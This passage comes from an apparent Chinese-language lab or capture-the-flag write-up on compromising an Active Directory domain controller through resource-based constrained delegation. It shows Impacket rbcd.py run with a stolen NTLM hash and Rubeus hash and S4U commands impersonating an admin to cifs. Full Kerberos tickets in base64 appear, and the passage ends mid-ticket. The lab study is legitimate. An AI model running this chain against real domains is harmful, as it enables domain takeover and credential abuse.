<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(base) <span class="built_in">PS</span> D:\red\内网\免杀工具包\免杀工具包\impacket<span class="literal">-0</span>.<span class="number">12.0</span>\examples&gt; python rbcd.py <span class="literal">-delegate-from</span> <span class="string">&#x27;EVILCOMPUTER$&#x27;</span> <span class="literal">-delegate-to</span> <span class="string">&#x27;ASLSRVAD05$&#x27;</span> <span class="literal">-action</span> <span class="string">&#x27;write&#x27;</span> <span class="string">&#x27;aoseluauto.com/svc_monadm01&#x27;</span> <span class="literal">-hashes</span> :ab232c3cf9f4b7cf27602082b04f306b <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br><span class="line">D:\Anaconda\Anaconda3\Lib\site<span class="literal">-packages</span>\requests\__init__.py:<span class="number">109</span>: RequestsDependencyWarning: urllib3 (<span class="number">2.3</span>.<span class="number">0</span>) or chardet (<span class="number">5.0</span>.<span class="number">0</span>)/charset_normalizer (<span class="number">2.0</span>.<span class="number">4</span>) doesn<span class="string">&#x27;t match a supported version!</span></span><br><span class="line"><span class="string">  warnings.warn(</span></span><br><span class="line"><span class="string">Impacket v0.9.23 - Copyright Fortra, LLC and its affiliated companies</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span></span><br><span class="line"><span class="string">[*] Delegation rights modified successfully!</span></span><br><span class="line"><span class="string">[*] EVILCOMPUTER$ can now impersonate users on ASLSRVAD05$ via S4U2Proxy</span></span><br><span class="line"><span class="string">[*] Accounts allowed to act on behalf of other identity:</span></span><br><span class="line"><span class="string">[*]     EVILCOMPUTER$   (S-1-5-21-198605783-2356506617-271110585-1245)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(base) PS D:\red\内网\免杀工具包\免杀工具包\impacket-0.12.0\examples&gt; python rbcd.py -delegate-from &#x27;</span>COMPUTER<span class="variable">$</span><span class="string">&#x27; -delegate-to &#x27;</span>ASLSRVAD05<span class="variable">$</span><span class="string">&#x27; -action &#x27;</span><span class="built_in">write</span><span class="string">&#x27; &#x27;</span>aoseluauto.com/svc_monadm01<span class="string">&#x27; -hashes :ab232c3cf9f4b7cf27602082b04f306b -dc-ip 172.16.34.5</span></span><br><span class="line"><span class="string">D:\Anaconda\Anaconda3\Lib\site-packages\requests\__init__.py:109: RequestsDependencyWarning: urllib3 (2.3.0) or chardet (5.0.0)/charset_normalizer (2.0.4) doesn&#x27;</span>t match a supported version!</span><br><span class="line">  warnings.warn(</span><br><span class="line">Impacket v0.<span class="number">9.23</span> - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Accounts allowed to act on behalf of other identity:</span><br><span class="line">[*]     EVILCOMPUTER<span class="variable">$</span>   (S<span class="literal">-1-5-21-198605783-2356506617-271110585-1245</span>)</span><br><span class="line">[*] Delegation rights modified successfully!</span><br><span class="line">[*] COMPUTER<span class="variable">$</span> can now impersonate users on ASLSRVAD05<span class="variable">$</span> via S4U2Proxy</span><br><span class="line">[*] Accounts allowed to act on behalf of other identity:</span><br><span class="line">[*]     EVILCOMPUTER<span class="variable">$</span>   (S<span class="literal">-1-5-21-198605783-2356506617-271110585-1245</span>)</span><br><span class="line">[*]     COMPUTER<span class="variable">$</span>    (S<span class="literal">-1-5-21-198605783-2356506617-271110585-1246</span>)</span><br></pre></td></tr></table></figure>



<p>获取新增虚拟用户的rc4</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe hash /password:<span class="number">123</span><span class="selector-tag">@</span><span class="comment">#ABC /user:test$ /domain:aoseluauto.com</span></span><br></pre></td></tr></table></figure>



<p>这里一开始先是用的Administrator，但是被禁用了</p>
<p><code>[X] KRB-ERROR (18) : KDC_ERR_CLIENT_REVOKED</code></p>
<p>更换一个域管理员账号</p>
<p>这里的rc4记得改为自己的</p>
<p>请求票据并导入</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:test<span class="variable">$</span> /rc4:<span class="number">3</span>A37C6AC3AFBEEF7A8EB36A4481BDED4 /domain:aoseluauto.com /msdsspn:cifs/ASLSRVAD05 /impersonateuser:SVC_ADM01 /nowrap /ptt /outfile:ticket.kirbi</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">C:\Users\hub&gt;Rubeus.exe s4u /user:test<span class="variable">$</span> /rc4:<span class="number">3</span>A37C6AC3AFBEEF7A8EB36A4481BDED4 /domain:aoseluauto.com /msdsspn:cifs/ASLSRVAD05 /impersonateuser:SVC_ADM01 /nowrap /ptt /outfile:ticket.kirbi</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">2.2</span></span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] <span class="keyword">Using</span> rc4_hmac hash: 3A37C6AC3AFBEEF7A8EB36A4481BDED4</span><br><span class="line">[*] Building AS<span class="literal">-REQ</span> (w/ preauth) <span class="keyword">for</span>: <span class="string">&#x27;aoseluauto.com\test$&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: 172.16.34.5:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFeDCCBXSgAwIBBaEDAgEWooIEijCCBIZhggSCMIIEfqADAgEFoRAbDkFPU0VMVUFVVE8uQ09NoiMwIaADAgECoRowGBsGa3JidGd0Gw5hb3NlbHVhdXRvLmNvbaOCBD4wggQ6oAMCARKhAwIBAqKCBCwEggQosvzRkTg69j8zlzYVH6ZyyZSQhKxigE/jNQl+lfY/bgIh/Y27t5IWy9JgYzgnvVXXFBY65+<span class="number">8</span>Mwk9MRdJbIQHk5PaoRZI9ww4VuImxz3ZF+U3KDOv7yDneM5NHvEYLf9XAKakKHGvIHMsPEi/sfPOzRGr6tlRGSpFUsRgUKH31z9EFxNRqzs5BMo3f1SFQageXWSEbyrCOzh5Jbljaw0ARWOtpzTrtCPq9vieSM2Tk2uFqppPbEbtDFMwewSxNd2ZscafImEch5kQasRLMPe7LiIJ6VsvzY0qwVF6/K9LF3W3wPDIwPFTjT3cIwN6I2nIOps1b0bFWBGqCRTqr0fdGb/+uf4SDXIlFgs3lc0dPrExzzmtBTaKCg+AbLVFE95ajgPXvx050Bj1Q73f99JnSmks9gZWJ2Z/Y4<span class="built_in">H</span>/wJ9ODNM11abODATr/<span class="number">8</span>PektowpZhSkRuIm3F8+YYOllA+ev9ZAeJaPb6y2mEEHCLfmKHLSFZTlCT2pfjFJWCW06WGPKojzYfRRnAYulGRAJYxgSYEI6Hq+bUXiJ3NyRl0CNSJR7WZXtn2Zkgs0KGOMr6XzpLwWxXZnjBCTO8QdgTCe0IZQ4WFFsnJR099AEeOkX2prozfbUAPbfz6HW7D4a6zNZdMfwG1cZWZaQUa6L2fnM/X8PEG5Dc3B8DNRubYyJ/FkcMG1ZOugW50FiBysRXhVRlmbkyX0wj0vjWLJiktk9MZa5Lq7vUskToJO8+vYIHsc7RDEm/z3cwnscr6MhAvNb7F2sr/<span class="number">4</span>GviLPiwix4wh1IInlEWXK00zqEDJijUxsVk4h6C3mumkp5iL22MdhYA9m9UdZLDTsP262LGTqpV7W9Ace88WKpPsJn6aWNQqH9pfETM3+<span class="number">7</span>s7hBCFq8956uBXMBn+<span class="number">4</span>XZDoWSXfpEH1GOtNE70YeCLds/PhK7VVkBbJUGM1ITHajv0Mru2Ejz02xtSA0EVcVj88am3UNOZxPcoiDM1srZQKtf+SHLQXlDfULlFccsa8OdRWMFZpcfy2PRk+<span class="number">0</span>AbMmbEIGzBL1FmlKp4wzSHOXoS/h9BYlt0XVp8vgjbi8i01LGe2d6tmYCy6TQBaO5qZOdi/e3JbOupzt/<span class="number">7</span>h0l14sJdoTNPKvkDN604pm7qFAGeebHKP9w9dcsHDoQ1QaWv8or9CT4tDk1gPnuwJ7luAsX30xKrLmvFe7tAAMGjMawF2CZYXrxCU8W8<span class="built_in">H</span>+orNxsEj23O8ZI2f81eiGHQPHSacxlnv+/eLRBtCZ30Al2ou/<span class="number">8</span>J9+B23Sb6JpPP0wJ1IoVBiXwEZRdbticCaE5nFX2rFaY4CzlXJzuxXKSIKIFhnxFFFtF3wV19Q04MSQvb3gHxEEsfc1y3T8sCR1+<span class="number">6</span>kn8p7BNemh25fLOarQUtZyfU12YAfYmZ/<span class="number">1</span>zL/JZWQKV2UJFW28pkwimjf46jgdkwgdagAwIBAKKBzgSBy32ByDCBxaCBwjCBvzCBvKAbMBmgAwIBF6ESBBDiwau1b7YA8zEtgpt++J78oRAbDkFPU0VMVUFVVE8uQ09NohIwEKADAgEBoQkwBxsFdGVzdCSjBwMFAEDhAAClERgPMjAyNTA3MTEwNjQyMzhaphEYDzIwMjUwNzExMTY0MjM4WqcRGA8yMDI1MDcxODA2NDIzOFqoEBsOQU9TRUxVQVVUTy5DT02pIzAhoAMCAQKhGjAYGwZrcmJ0Z3QbDmFvc2VsdWF1dG8uY29t</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] Building S4U2self request <span class="keyword">for</span>: <span class="string">&#x27;test$@AOSELUAUTO.COM&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: ASLSRVAD05.aoseluauto.com (172.16.34.5)</span><br><span class="line">[*] Sending S4U2self request to <span class="number">172.16</span>.<span class="number">34.5</span>:<span class="number">88</span></span><br><span class="line">[+] S4U2self success!</span><br><span class="line">[*] Got a TGS <span class="keyword">for</span> <span class="string">&#x27;SVC_ADM01&#x27;</span> to <span class="string">&#x27;test$@AOSELUAUTO.COM&#x27;</span></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFyjCCBcagAwIBBaEDAgEWooIE2TCCBNVhggTRMIIEzaADAgEFoRAbDkFPU0VMVUFVVE8uQ09NohIwEKADAgEBoQkwBxsFdGVzdCSjggSeMIIEmqADAgEXoQMCAQKiggSMBIIEiBpcDaFpskxr1Mka/vu5cxr3AiGf7wQy8gdUedySlbsgLSu+GEl8QHzfC+ONfTQIFttTGeUMwtz/g2SlmydWpNTOp6kdrZbS1vNZPWSQ+Wz/n1gmp6hvNLIWrlt3AGcU3TFnsUbVMlKoNX1Hz9MaGy/okm9FhxWslwyQ74hXgBntWL5c1EhqiewuwWEJrBILvxDN7lFer62jru2aTS9tiOAVedTJLorJwoQ14XtrRhs1wkThw7pvFjI88DVKCEs60bl6BX3fRGiol4i+puU5cPmr4IGLXTDR/YHneHXDqdIRs1bt4XMbZ1Z5jEaqygaP/<span class="number">6</span>dUovE96cgdN2kN223D5KNTaQTReoGRy0gmi4feQIbTeZ13/QFOUULw8oIelKuU0RrECo3Q3xVZaDkbTN9OGIIHIIfUVEhhQx9iYCuAIpLhtnEhVW+<span class="number">7</span>SR+<span class="number">6</span>th2ltRFAd4BCoohHvo7yVv4BsZh61SDM6rUJdWVlZ+lXu7CsiOg7ChfqBFAOXBpMODjoDeQTS4qiGJ9tUYDbdQRelRFBV9ZumQ6uVXm71Se1ypENGAwdHSWoxmKxX2A1WztwAOZpP4oQda7VmxVnDV6gpblUGwA72cyk0JwLnZqy6W1ueDpcqmrRtj2vpjEofqVs8bw+tr87xU5DdH0TEPHIoiR5ZpkIqqO73n+edil2WTqk4yTvF83VOMBEZWcNiMnijJxoNoKrtVgdoziBsICLk8SfjLrMwMWVrIM4xn6ilvYZAcy531r5Wrd47FRvaURhFf5lFvglxXdGgNoX6rUi3pvtMTQZ7RI7z3eRJH+VkSLaBhoRTrWTnnJYebpIEuwD/PGlOz9AG9WulpCqIDspCPCvc1FSwlLmq5VK0ECoUgbYT90GiWiEGKiMRB0lR1CcsBI2gdP87TnR2STO61Fea8btxiVWaDO8SW4o0jHCcEmyuetAHgu1hyj3o/r0TIR5RP0LtG3TZUs8M1JjIC07WLLzI/ymciXFzIQCqLPI/m8/z5Zo1nHVRgABIrUpLZvl+ahVRvMhid9MlX0BEnnlmbj/<span class="number">1</span>w3ugA04BJolxX0DMsno9zRHF6sLHqJoDboTrqgviE7LeLhjir2JjGgMfux7Uw0aixTHMX1AeuNIT5sC7+Yo3shUfnicV3Wt/oo1BxOqnx+AeJJyYC+bF7cBNL0ucxp7V5deidJ42QGa/XMS8iqOOLaQLtbHpdwR28BOTMVzhuqMrXprmE+<span class="number">8</span>kJVSSMKw6AxmLb29ewr/T9iMPKkkrq1CYklcVl8cLrMG0uykH8MbHOT67clQpfmHKDLW2YKaQErwFvk3b0a14bqu988ousxYmfQWYu9jUIOPZCi8YrNzbSS+lgG0Vw0loGz5qtDhqkcXQAXeTlG3s7byAs7+jHDJGfP7mBvkbWBdpJDpVvYsn361YouNu+tCiqW/IMZwn8E1ZnsVl6h80FDm4uAWxbe5het+GrbroU1HuaQQsNAEIv3qQRrvBPtUY7GGRPqBkURgevXls5GUv29KeDwzrSpiKgfYxPKr1mFCvkih2w+<span class="number">80</span>acIsnDYxQ3aabQdo4HcMIHZoAMCAQCigdEEgc59gcswgciggcUwgcIwgb+gKzApoAMCARKhIgQgFi745SGRLv1bOW2Qw5mNC0YrUMA/RtfYKJzlMCfUmt6hEBsOQU9TRUxVQVVUTy5DT02iFjAUoAMCAQqhDTALGwlTVkNfQURNMDGjBwMFAEChAAClERgPMjAyNTA3MTEwNjQyMzhaphEYDzIwMjUwNzExMTY0MjM4WqcRGA8yMDI1MDcxODA2NDIzOFqoEBsOQU9TRUxVQVVUTy5DT02pEjAQoAMCAQGhCTAHGwV0ZXN0JA==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Ticket written to ticket_SVC_ADM01_to_test<span class="variable">$</span>@AOSELUAUTO.COM.kirbi</span><br><span class="line"></span><br><span class="line">[*] Impersonating user <span class="string">&#x27;SVC_ADM01&#x27;</span> to target SPN <span class="string">&#x27;cifs/ASLSRVAD05&#x27;</span></span><br><span class="line">[*] Building S4U2proxy request <span class="keyword">for</span> service: <span class="string">&#x27;cifs/ASLSRVAD05&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: ASLSRVAD05.aoseluauto.com (172.16.34.5)</span><br><span class="line">[*] Sending S4U2proxy request to domain controller <span class="number">172.16</span>.<span class="number">34.5</span>:<span class="number">88</span></span><br><span class="line">[+] S4U2proxy success!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi) <span class="keyword">for</span> SPN <span class="string">&#x27;cifs/ASLSRVAD05&#x27;</span>:</span><br><span class="line"></span><br><span class="line">      doIGXDCCBligAwIBBaEDAgEWooIFcDCCBWxhggVoMIIFZKADAgEFoRAbDkFPU0VMVUFVVE8uQ09Noh0wG6ADAgECoRQwEhsEY2lmcxsKQVNMU1JWQUQwNaOCBSowggUmoAMCARKhAwIBBKKCBRgEggUUBpJm6Q6qlSPloxxeRUbQSrVrIJjQG0PxFxx7gcNfZsnoQrJDVApcddXZhmFl8CS4544vVLbakXEJbJA015GIzn+aGUXdFT7RBs5T/kXoRp6fcOIYYGiIi/WObD/NVu9kopNIza/<span class="number">9</span>D07P65CKBHqT9BxAFkIJQVafKnv9Du4XoppSzjCCdSkjWbi0KjXOwwPloL1aP6SJLdkAZosnjnGQ2Tp5G40xM3LVRynJp3bKXD5wzKeEWcF0pdpFyBBZzjXpCfwtj37Ny6MsUv6xi4WtLr5VuhPIECJ3k8QZ4KKpxfpPlAzMp6RaPL+<span class="number">3</span>lNBqpRJRP7Mq39nqOQmSmVKmO9eNpjjYMElCWCA2zSfN4F+hXsztv92Mdoqbh9ulsovEAuO8f4fie7NwqL3Mg2DwPzF8AvkBlX7WVjecoVKzyarBnntMhKQcG5Cbl3Y8HjaAuAhaMVM7gzudNBz8j+xYLJ8f+<span class="number">2</span>O/PO7MAFm9TQAyFirVbpWQqRRHnj19nzAfJ66N4bs5x7dsk/g4Mn2Qfk/YYDqeQYt+WFQszVzPsAcxgZkZ2LtV4nq0Nsj9CdKkF8W1sD25qDuvZ7kzLnalJRlCbWQzCO3GSQQv1gWXGS+jIRBIaSOKwpg0MbHaYmAme7TjXBKu5ZqpNwF8KzgPrKqeHiSBGr29OefUL62V+NRXI5isvnoC+<span class="number">31</span>r1jC05a9XkbNeOkebOqT35hNu9EtUuxICHgiY1PVR2FqXEanYyOpC8V4nOePeMA9VUZ/KEQ5uiVyTX+aqA64APbii2ZZ1XJ1EBU07ZOvb0reuxLWScyiTCvjoJ6TlD8Em6tYAFgVyXSCNHeT8ZoA8etiVy/Sc7ItrRHIJTUIoacuvDxkDHDWfFZIU8kWmOomLYpqi/v8QmVU7W8o71U3+AX5CGgZb6WmC3N8QTrUQKyinhQgy5eG2haD03l21JCJO1avslc4UWzT/bXpmU6aGVMD1HfMEvT0kMUrqKI2BuKZVu+PNURdv5enn5hG2rklN4kjSev3pmaq20lKh9pOfBF9+Ll4aQ17R2wcqfpI9TLp+<span class="number">2</span>r8LYgwUsV6rwT+VKQyRzPZDiX6NJt3Ryd3J4H5sItgWLVg6Dt+c/<span class="number">0</span>FhBD2rXbhdKL7EHbwEble9O1uVrhLjsRV3+afqkM++k+c/c7m5UGvpwxkFGyLJRyXUrdlBtn9uCPG0LVYkihwAdBzm4E01GUow4ZdrWo2FCpEmTUkHARcymI+UQfDBVYgQ5K3XX6ZsKIf6OZ8Xgu9YQlHClM/ZBcDtkc+bFYbRBnZIjAZ45NjgIwNOIQM7glAShenEFd4MfItcVFjVAw+H8OYwgGZSSvdXLd7/<span class="number">9</span>hBn7KMssfZLQV8M3JovKeg+z2GYp0Djy7ucNWwbSW338sR02MP7Apkhk3<span class="built_in">rv</span>/yHRD01C2mj4DCH3PW0AUacyehUYpzlj5WWDogNl/<span class="number">1</span>+GKsdaoBLptLJ1r9+K1ZuHIX5w5SJemvTgmoyOGjW1ZvXpskzydT9Np9VaNi+uiNs5U7rVIu7/vlElNKHkIFLSdE/d1iqSywMslVtraFmaOOrRMqPCRo9L6n+<span class="number">4</span>OGDbmNOazwvrUh7ug8sQOLNZmt6Brl5a+loXqP5o7EorbcVbln/<span class="number">0</span>r33StBSyLKYPHlFbxfQm8ccBYFJRDWrIBXsgirri3aTfTdF/NDwfDVzWyTiO4NwPEEPiWChYpG8s8l/yIQ6fqmjyEZ1Xi2MpJQqfPdvUEmbRv3lOnr4WyiwUiqOB1zCB1KADAgEAooHMBIHJfYHGMIHDoIHAMIG9MIG6oBswGaADAgERoRIEEGq+Upi69XRHv/o7x5QguAqhEBsOQU9TRUxVQVVUTy5DT02iFjAUoAMCAQqhDTALGwlTVkNfQURNMDGjBwMFAEClAAClERgPMjAyNTA3MTEwNjQyMzhaphEYDzIwMjUwNzExMTY0MjM4WqcRGA8yMDI1MDcxODA2NDIzOFqoEBsOQU9TRUxVQVVUTy5DT02pHTAboAMCAQKhFDASGwRjaWZzGwpBU0xTUlZBRDA1</span><br></pre></td></tr></table></figure>



<p>导入成功了，这里其实可以直接dir读取flag了，但是我还是想尝试ptt</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/52.png"></p>
<p>.\Rubeus.exe hash &#x2F;password:123@#ABC &#x2F;user:test$ &#x2F;domain:aoseluauto.com复制最后这个base64的票据，把他由 <code>.kirbi</code> 转换为impacket支持的 <code>.ccache</code> 格式</p>
<p><font style="color:rgb(218, 219, 248);background-color:rgb(20, 19, 39);"></font></p>
<p><font style="color:rgb(218, 219, 248);background-color:rgb(20, 19, 39);"></font></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> doIGXDCCBligAwIBBaEDAgEWooIFcDCCBWxhggVoMIIFZKADAgEFoRAbDkFPU0VMVUFVVE8uQ09Noh0wG6ADAgECoRQwEhsEY2lmcxsKQVNMU1JWQUQwNaOCBSowggUmoAMCARKhAwIBBKKCBRgEggUUBpJm6Q6qlSPloxxeRUbQSrVrIJjQG0PxFxx7gcNfZsnoQrJDVApcddXZhmFl8CS4544vVLbakXEJbJA015GIzn+aGUXdFT7RBs5T/kXoRp6fcOIYYGiIi/WObD/NVu9kopNIza/<span class="number">9</span>D07P65CKBHqT9BxAFkIJQVafKnv9Du4XoppSzjCCdSkjWbi0KjXOwwPloL1aP6SJLdkAZosnjnGQ2Tp5G40xM3LVRynJp3bKXD5wzKeEWcF0pdpFyBBZzjXpCfwtj37Ny6MsUv6xi4WtLr5VuhPIECJ3k8QZ4KKpxfpPlAzMp6RaPL+<span class="number">3</span>lNBqpRJRP7Mq39nqOQmSmVKmO9eNpjjYMElCWCA2zSfN4F+hXsztv92Mdoqbh9ulsovEAuO8f4fie7NwqL3Mg2DwPzF8AvkBlX7WVjecoVKzyarBnntMhKQcG5Cbl3Y8HjaAuAhaMVM7gzudNBz8j+xYLJ8f+<span class="number">2</span>O/PO7MAFm9TQAyFirVbpWQqRRHnj19nzAfJ66N4bs5x7dsk/g4Mn2Qfk/YYDqeQYt+WFQszVzPsAcxgZkZ2LtV4nq0Nsj9CdKkF8W1sD25qDuvZ7kzLnalJRlCbWQzCO3GSQQv1gWXGS+jIRBIaSOKwpg0MbHaYmAme7TjXBKu5ZqpNwF8KzgPrKqeHiSBGr29OefUL62V+NRXI5isvnoC+<span class="number">31</span>r1jC05a9XkbNeOkebOqT35hNu9EtUuxICHgiY1PVR2FqXEanYyOpC8V4nOePeMA9VUZ/KEQ5uiVyTX+aqA64APbii2ZZ1XJ1EBU07ZOvb0reuxLWScyiTCvjoJ6TlD8Em6tYAFgVyXSCNHeT8ZoA8etiVy/Sc7ItrRHIJTUIoacuvDxkDHDWfFZIU8kWmOomLYpqi/v8QmVU7W8o71U3+AX5CGgZb6WmC3N8QTrUQKyinhQgy5eG2haD03l21JCJO1avslc4UWzT/bXpmU6aGVMD1HfMEvT0kMUrqKI2BuKZVu+PNURdv5enn5hG2rklN4kjSev3pmaq20lKh9pOfBF9+Ll4aQ17R2wcqfpI9TLp+<span class="number">2</span>r8LYgwUsV6rwT+VKQyRzPZDiX6NJt3Ryd3J4H5sItgWLVg6Dt+c/<span class="number">0</span>FhBD2rXbhdKL7EHbwEble9O1uVrhLjsRV3+afqkM++k+c/c7m5UGvpwxkFGyLJRyXUrdlBtn9uCPG0LVYkihwAdBzm4E01GUow4ZdrWo2FCpEmTUkHARcymI+UQfDBVYgQ5K3XX6ZsKIf6OZ8Xgu9YQlHClM/ZBcDtkc+bFYbRBnZIjAZ45NjgIwNOIQM7glAShenEFd4MfItcVFjVAw+H8OYwgGZSSvdXLd7/<span class="number">9</span>hBn7KMssfZLQV8M3JovKeg+z2GYp0Djy7ucNWwbSW338sR02MP7Apkhk3<span class="built_in">rv</span>/yHRD01C2mj4DCH3PW0AUacyehUYpzlj5WWDogNl/<span class="number">1</span>+GKsdaoBLptLJ1r9+K1ZuHIX5w5SJemvTgmoyOGjW1ZvXpskzydT9Np9VaNi+uiNs5U7rVIu7/vlElNKHkIFLSdE/d1iqSywMslVtraFmaOOrRMqPCRo9L6n+<span class="number">4</span>OGDbmNOazwvrUh7ug8sQOLNZmt6Brl5a+loXqP5o7EorbcVbln/<span class="number">0</span>r33StBSyLKYPHlFbxfQm8ccBYFJRDWrIBXsgirri3aTfTdF/NDwfDVzWyTiO4NwPEEPiWChYpG8s8l/yIQ6fqmjyEZ1Xi2MpJQqfPdvUEmbRv3lOnr4WyiwUiqOB1zCB1KADAgEAooHMBIHJfYHGMIHDoIHAMIG9MIG6oBswGaADAgERoRIEEGq+Upi69XRHv/o7x5QguAqhEBsOQU9TRUxVQVVUTy5DT02iFjAUoAMCAQqhDTALGwlTVkNfQURNMDGjBwMFAEClAAClERgPMjAyNTA3MTEwNjQyMzhaphEYDzIwMjUwNzExMTY0MjM4WqcRGA8yMDI1MDcxODA2NDIzOFqoEBsOQU9TRUxVQVVUTy5DT02pHTAboAMCAQKhFDASGwRjaWZzGwpBU0xTUlZBRDA1 &gt; ticket.kirbi.b64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> ticket.kirbi.b64 |tr <span class="literal">-d</span> <span class="string">&#x27; &#x27;</span> |tr <span class="literal">-d</span> <span class="string">&#x27;\n&#x27;</span> |base64 <span class="literal">-d</span> &gt;ticket.kirbi</span><br></pre></td></tr></table></figure>







<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">kali</span>/<span class="type">red</span>/<span class="type">temp</span>]</span><br><span class="line">└─<span class="comment"># echo doIGXDCCBligAwIBBaEDAgEWooIFcDCCBWxhggVoMIIFZKADAgEFoRAbDkFPU0VMVUFVVE8uQ09Noh0wG6ADAgECoRQwEhsEY2lmcxsKQVNMU1JWQUQwNaOCBSowggUmoAMCARKhAwIBBKKCBRgEggUUBpJm6Q6qlSPloxxeRUbQSrVrIJjQG0PxFxx7gcNfZsnoQrJDVApcddXZhmFl8CS4544vVLbakXEJbJA015GIzn+aGUXdFT7RBs5T/kXoRp6fcOIYYGiIi/WObD/NVu9kopNIza/9D07P65CKBHqT9BxAFkIJQVafKnv9Du4XoppSzjCCdSkjWbi0KjXOwwPloL1aP6SJLdkAZosnjnGQ2Tp5G40xM3LVRynJp3bKXD5wzKeEWcF0pdpFyBBZzjXpCfwtj37Ny6MsUv6xi4WtLr5VuhPIECJ3k8QZ4KKpxfpPlAzMp6RaPL+3lNBqpRJRP7Mq39nqOQmSmVKmO9eNpjjYMElCWCA2zSfN4F+hXsztv92Mdoqbh9ulsovEAuO8f4fie7NwqL3Mg2DwPzF8AvkBlX7WVjecoVKzyarBnntMhKQcG5Cbl3Y8HjaAuAhaMVM7gzudNBz8j+xYLJ8f+2O/PO7MAFm9TQAyFirVbpWQqRRHnj19nzAfJ66N4bs5x7dsk/g4Mn2Qfk/YYDqeQYt+WFQszVzPsAcxgZkZ2LtV4nq0Nsj9CdKkF8W1sD25qDuvZ7kzLnalJRlCbWQzCO3GSQQv1gWXGS+jIRBIaSOKwpg0MbHaYmAme7TjXBKu5ZqpNwF8KzgPrKqeHiSBGr29OefUL62V+NRXI5isvnoC+31r1jC05a9XkbNeOkebOqT35hNu9EtUuxICHgiY1PVR2FqXEanYyOpC8V4nOePeMA9VUZ/KEQ5uiVyTX+aqA64APbii2ZZ1XJ1EBU07ZOvb0reuxLWScyiTCvjoJ6TlD8Em6tYAFgVyXSCNHeT8ZoA8etiVy/Sc7ItrRHIJTUIoacuvDxkDHDWfFZIU8kWmOomLYpqi/v8QmVU7W8o71U3+AX5CGgZb6WmC3N8QTrUQKyinhQgy5eG2haD03l21JCJO1avslc4UWzT/bXpmU6aGVMD1HfMEvT0kMUrqKI2BuKZVu+PNURdv5enn5hG2rklN4kjSev3pmaq20lKh9pOfBF9+Ll4aQ17R2wcqfpI9TLp+2r8LYgwUsV6rwT+VKQyRzPZDiX6NJt3Ryd3J4H5sItgWLVg6D